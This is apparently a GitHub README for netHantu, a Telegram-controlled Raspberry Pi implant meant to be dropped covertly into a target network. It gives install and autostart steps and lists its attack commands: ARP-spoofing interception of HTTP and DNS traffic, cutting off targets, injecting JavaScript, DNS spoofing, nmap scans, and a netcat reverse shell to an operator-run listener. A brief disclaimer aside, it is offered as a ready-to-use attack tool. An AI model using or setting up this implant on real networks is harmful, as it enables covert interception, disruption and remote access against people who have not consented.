<p align=center>
<a href="https://github.com/akukisopo/nethantu/blob/master/README.md"><img src="https://github.com/akukisopo/nethantu/raw/master/img/netHantu.png"/>
</a>
<a href="https://github.com/akukisopo/nethantu">
    <img src="https://img.shields.io/badge/python-3.3%2C%203.4%2C%203.5%2C%203.6-brightgreen.svg" align=center/>
</a>
<a href="https://github.com/akukisopo/nethantu/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/license-MIT-blue.svg" align=center/>
</a>
<a href="https://github.com/akukisopo/nethantu">
    <img src="https://img.shields.io/github/stars/akukisopo/nethantu.svg" align=center/>
</a>
</p>

<h3 align=center><i>The Tactical Toolkit for network control uses Telegram chat</i></h3>

<h1 align=center>features:</h1>
<p align=center>
<a href="https://github.com/akukisopo/nethantu/blob/master/README.md"><img src="https://raw.githubusercontent.com/akukisopo/nethantu/master/img/features.png"/></a>
</p>

<br><br>

<p align=center>
<a href="https://github.com/akukisopo/nethantu/blob/master/DEMOS.MD"><img src="img/demos-button.png" align=center width=40%/></a>
<br><br><br>
</p>

<h1 align=center>installation:</h1>

<h3 align=center>warning:</h3>

<p align=center>netHantu is designed for single board like <b>Raspberry Pis</b> (<b>Raspbian</b>/<b>Kali for RPi</b>). Running it on other/desktop distros could cause issues and may not work as excepted.</p>

You will need a single board like  **Raspberry Pi** with **fresh Raspbian/Kali** on the SD card, because you don't want anything else running in the background.

Boot up the Pi, get an SSH sell or connect a monitor and a keyboard and enter these commands:

```
$ sudo apt install git
$ sudo apt update && sudo apt install python3 python3-pip
$ git clone https://github.com/akukisopo/nethantu
$ cd nethantu
$ chmod 777 setup.py
$ sudo ./setup.py
```

if u get error "PIP" do it :

```
$ sudo python3 -m pip install --upgrade pip setuptools wheel
```

If you want to use Wifi connection it must be configured on wpa_supplicant.

```
sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
```

configuration contents. example:

```
country=US                                                                             
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev          
update_config=1                           
network={                        
        ssid="Home-Wifi"                         
        psk="AkuT4kTahu"                             
        key_mgmt=WPA-PSK       
```

after saving the configuration, run this command:

```
sudo systemctl restart dhcpcd.service
sudo systemctl restart networking.service
sudo reboot
```

Please **read** the questions/messages while running the setup script!

<h4>step 1/4 - setup.py</h4>

```
[+] Please enter the name of the network interface connected/will
be connected to the target LAN. Default wired interface is <b>'eth0'</b>,
and the default wireless interface is <b>'wlan0'</b> on most systems, but
you can check it in a different terminal with the <b>'ifconfig'</b> command.
```

<h4>step 2/4 - setup.py</h4>

```
[+] Please create a Telegram API key by messaging @BotFather on Telegram
with the command '/newbot'.

After this, @BotFather will ask you to choose a name for your bot.
This can be anything you want.

Lastly, @BotFather will ask you for a username for your bot. You have
to choose a unique username here which ends with 'bot'. For
example: hantubot. Make note of this username, since later
you will have to search for this to find your bot, which netHantu
will be running on.

After you send your username of choise to @BotFather, you will recieve
your API key.
```

<p align=center>
<img src="https://github.com/akukisopo/nethantu/raw/master/img/screenshot-telegram-1.png"/>
</p>

<h4>step 3/4 - setup.py</h4>

```
[+] Now for netHantu to only allow access to you, you need to verify yourself.

Send the verification code below TO THE BOT you just created. Just search for your
bot's @username (what you sent to @BotFather) to find it.

[+] Verification code to send: ******
```

<h4>step 4/4 - setup.py</h4>

```
[+] Do you want netHantu to start on boot? This option is necessary if you are using
this device as a dropbox, because when you are going to drop this device into a
network, you will not have the chanse to start netHantu remotely! (autostart works
by adding a new cron '@reboot' entry)
```

<h3 align=center>If you are ready with the setup just reboot the Pi and netHantu will start right up!</3>
<br><br>

<h1 align=center>usage:</h1>

<h3 align=center>warnings:</h3>

<p align=center>Using netHantu on a networks bigger than /24 is <b>not recommended</b> because the scans will take too long.</p>

<p align=center>netHantu is <b>not quiet</b>. Anyone monitoring the traffic can see the ARP packets!</p>

<h3>drop it into a network:</h3>

If you have selected `yes` at `step 4/4 (autostart)` the Pi is fully set up for dropping. netHantu should start up on boot, and send you a message on Telegram with the text: `netHantu started! 👻`.

Make sure to try it out in your lab first and test if netHantu is responding to your messages!

If you are all set, just connect it to the target network by plugging in the Ethernet cable into the Pi and connecting the power via micro USB and you are ready to go!

(netHantu can also work over WiFi, but you will need to set up `wpa_supplicant` to connect to the network automatically first)

<h3>available commands:</h3>

```
/scan - Scan LAN network
/scanip [TARGET-IP] - Scan a specific IP address.
/kill [TARGET-IP] - Stop the target's network connection.
/mitm [TARGET-IP] - Capture HTTP/DNS traffic from target.
/replaceimg [TARGET-IP] - Replace HTTP images requested by target.
/injectjs [TARGET-IP] [JS-FILE-URL] - Inject JavaScript into HTTP pages requested by target.
/spoofdns [TARGET-IP] [DOMAIN] [FAKE-IP] - Spoof DNS records for target.
/attacks - View currently running attacks.
/stop [ATTACK-ID] - Stop a currently running attack.
/restart - Restart netHantu.
/reversesh [TARGET-IP] [PORT] - Create a netcat reverse shell to target.
/help - Display the help menu.
/ping - Pong.
```

<h3>attack system:</h3>

You can start an attack by using one of these commands: `/kill, /mitm, /replaceimg, /injectjs, /spoofdns`

Ater you have one or more attacks running, you can use the `/attack` command to get a list of them containing the `ATTACK-ID`'s.

To stop an attack type `/stop [ATTACK-ID]`.

<h3>reverse shell:</h3>

<h3 align=center>warning:</h3>

<p align=center><code>/reversesh</code> only makes a netcat TCP connection which is not encrypted and all the traffic can be monitored! Only use it for emergency fixes or for setting up an encrypted reverse connection if necessary.</p>

The `/reversesh` command is for getting a reverse shell on the Pi, when its not accessable from the outside.

To use the `/reversesh` command you will need to have a server listening for the shell.

Netcat command to start up the listener on your server:

```
$ nc -l 0.0.0.0 [PORT]
```

Telegram command:

```
/reversesh [IP-of-your-listening-server] [PORT]
```

<h3>attacks:</h3>

  * `/kill` - Stops the internet connectivity for the target.
  * `/mitm` - Captures HTTP and DNS traffic from the target and sends it in text messages.
  * `/replaceimg` -  Replaces HTTP images for the target to what picture you send to the bot.
  * `/injectjs` - Injects JavaScript into every HTTP HTML response for the target. You need to host the the JS file on your server and give the URL as a parameter.
  * `/spoofdns` - Spoofs DNS responses for the target.

All attacks use **ARP Spoofing**!

<h3>scans:</h3>

  * `/scan` - Scans the local network and returns the hosts online. Uses `nmap -sn` scan to discover hosts.
  * `/scanip` - Scans an IP address for open ports and other info. Uses `nmap -sS` scan.

<h3>notifications:</h3>

You will get a message every time when a new device connects/leaves the network.

<h1 align=center>disclaimer:</h1>

<h3 align=center>I'm not responsible for anything you do with this program, so please only use it for good and educational purposes.</h3>

<h1 align=center>legal:</h1>

<p align=center>
Salam dari by Ghostbusters Team.<br><br>
</p>
